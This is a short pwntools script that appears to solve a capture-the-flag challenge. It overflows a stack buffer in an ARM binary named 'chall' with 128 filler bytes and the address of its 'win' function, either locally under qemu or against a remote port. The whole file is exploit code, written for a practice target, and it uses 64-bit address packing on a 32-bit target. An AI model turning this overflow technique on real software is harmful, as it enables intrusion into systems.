from pwn import *
 
context.log_level = "debug"
context.arch = "arm"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './chall'])
    #io = process([vuln_path])
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

#u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
ddebug()
payload = b'A'*128
payload += p64(elf.symbols["win"])

io.sendlineafter("to message: ", payload)

io.interactive()
